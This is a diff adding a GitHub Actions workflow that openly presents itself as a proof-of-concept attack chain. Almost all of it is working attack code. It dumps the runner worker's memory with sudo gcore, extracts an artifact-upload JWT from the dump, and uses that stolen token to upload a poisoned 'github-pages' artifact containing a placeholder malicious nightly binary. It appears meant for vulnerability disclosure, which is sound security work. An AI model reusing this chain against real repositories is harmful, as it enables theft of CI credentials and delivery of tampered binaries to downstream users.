@@ -1,0 +1,138 @@
+name: 0-Priv Full Chain Attack
+# Single workflow that, with only contents:read perms, uploads a poisoned
+# github-pages artifact containing a malicious nightlies/v0.54 binary.
+# Then we trigger build-nightlies.yml + open a PR to demo the full RCE.
+
+on:
+  pull_request:
+  workflow_dispatch:
+
+permissions:
+  contents: read   # MINIMAL — fork PR equivalent
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.21' }
+
+      - name: 1. Build poisoned github-pages payload
+        run: |
+          set -e
+          mkdir -p stage/nightlies/v0.54
+
+          # The malicious binary
+          cat > stage/nightlies/v0.54/myapp-linux-amd64 <<'EOF'
+          #!/bin/bash
+          echo ""
+          echo "================================================="
+          echo "  💀 0-PRIV FULL CHAIN RCE 💀"
+          echo "  Attacker code running with NO privileges"
+          echo "  Token stolen from Worker memory via sudo gcore"
+          echo "  Artifact uploaded via Twirp API"
+          echo "  Pages serving this binary"
+          echo "================================================="
+          env | grep -E '^(GITHUB|RUNNER|CI)_' | head -10
+          EOF
+          chmod +x stage/nightlies/v0.54/myapp-linux-amd64
+
+          tar -czf stage/nightlies/v0.54/myapp-linux-amd64.tar.gz \
+            -C stage/nightlies/v0.54 myapp-linux-amd64
+          (cd stage/nightlies/v0.54 && \
+            sha256sum myapp-linux-amd64.tar.gz > myapp-linux-amd64.tar.gz.sha256)
+          rm stage/nightlies/v0.54/myapp-linux-amd64
+
+          # Build artifact.tar (what GitHub Pages expects)
+          tar -cf /tmp/artifact.tar -C stage .
+          # Wrap in zip (what the artifact API stores)
+          (cd /tmp && zip -q payload.zip artifact.tar)
+          ls -la /tmp/payload.zip /tmp/artifact.tar
+
+      - name: 2. Steal Worker memory + extract JWT
+        run: |
+          set +e
+          sudo apt-get install -y gdb >/dev/null 2>&1
+          worker_pid=$(pgrep -f "Runner.Worker" | head -1)
+          mkdir -p /tmp/d && cd /tmp/d
+          sudo gcore -o w $worker_pid 2>&1 | tail -1
+          dump=$(ls w.* | head -1)
+
+          BEST_JWT=""
+          while IFS= read -r jwt; do
+            payload=$(echo "$jwt" | cut -d. -f2)
+            padded="${payload}$(printf '%*s' $((4 - ${#payload} % 4)) '' | tr ' ' '=')"
+            decoded=$(echo "$padded" | base64 -d 2>/dev/null)
+            if echo "$decoded" | grep -q "Actions.UploadArtifacts"; then
+              BEST_JWT="$jwt"
+              scp_line=$(echo "$decoded" | grep -oE 'Actions.UploadArtifacts:[a-f0-9-]+:[a-f0-9-]+' | head -1)
+              RUN_ID=$(echo "$scp_line" | cut -d: -f2)
+              JOB_ID=$(echo "$scp_line" | cut -d: -f3)
+              break
+            fi
+          done < <(sudo strings "$dump" 2>/dev/null | grep -oE 'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{20,}' | sort -u)
+
+          if [ -z "$BEST_JWT" ]; then
+            echo "FAILED — no token"
+            exit 1
+          fi
+
+          echo "Token extracted, run_id=$RUN_ID, job_id=$JOB_ID"
+          # Save for next step
+          echo "BEST_JWT=$BEST_JWT" >> /tmp/exfil
+          echo "RUN_ID=$RUN_ID"     >> /tmp/exfil
+          echo "JOB_ID=$JOB_ID"     >> /tmp/exfil
+          # Cleanup big dump
+          sudo rm -f "$dump"
+
+      - name: 3. Upload poisoned artifact named "github-pages"
+        run: |
+          set -e
+          source /tmp/exfil
+          RESULTS_URL="https://results-receiver.actions.githubusercontent.com"
+          ART_NAME="github-pages"
+
+          echo "Calling CreateArtifact..."
+          create_resp=$(curl -sS -X POST \
+            -H "Authorization: Bearer $BEST_JWT" \
+            -H "Content-Type: application/json" \
+            -d "$(printf '{"workflow_run_backend_id":"%s","workflow_job_run_backend_id":"%s","name":"%s","version":4}' "$RUN_ID" "$JOB_ID" "$ART_NAME")" \
+            "$RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact")
+          echo "CreateArtifact: $(echo "$create_resp" | head -c 150)"
+
+          UPLOAD_URL=$(echo "$create_resp" | grep -oE '"signed_upload_url":"[^"]*"' | sed 's/"signed_upload_url":"//;s/"$//')
+          [ -z "$UPLOAD_URL" ] && { echo "no upload URL"; exit 1; }
+
+          # Upload the zip (contains artifact.tar with poisoned site)
+          BLOCK_ID=$(echo -n "block1" | base64)
+          curl -sS -X PUT \
+            -H "x-ms-blob-type: BlockBlob" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @/tmp/payload.zip \
+            "${UPLOAD_URL}&comp=block&blockid=${BLOCK_ID}" -w "PUT: %{http_code}\n" -o /dev/null
+
+          # Commit block list
+          curl -sS -X PUT -H "Content-Type: application/xml" \
+            -d "<?xml version=\"1.0\" encoding=\"utf-8\"?><BlockList><Latest>$BLOCK_ID</Latest></BlockList>" \
+            "${UPLOAD_URL}&comp=blocklist" -w "Commit: %{http_code}\n" -o /dev/null
+
+          SIZE=$(wc -c < /tmp/payload.zip)
+          # Compute SHA256 in hex (FinalizeArtifact requires it)
+          SHA=$(sha256sum /tmp/payload.zip | awk '{print $1}')
+
+          echo "Calling FinalizeArtifact size=$SIZE..."
+          final_resp=$(curl -sS -X POST \
+            -H "Authorization: Bearer $BEST_JWT" \
+            -H "Content-Type: application/json" \
+            -d "$(printf '{"workflow_run_backend_id":"%s","workflow_job_run_backend_id":"%s","name":"%s","size":"%s","hash":"sha256:%s"}' "$RUN_ID" "$JOB_ID" "$ART_NAME" "$SIZE" "$SHA")" \
+            "$RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact")
+          echo "FinalizeArtifact: $(echo "$final_resp" | head -c 150)"
+
+      - name: 4. Verify poisoned artifact exists with name=github-pages
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          sleep 8
+          gh api "repos/$GITHUB_REPOSITORY/actions/artifacts?name=github-pages&per_page=10" \
+            --jq '.artifacts | sort_by(.created_at) | reverse | .[0:3] | .[] | {id, name, size, created_at, head_branch: .workflow_run.head_branch, run: .workflow_run.id}'
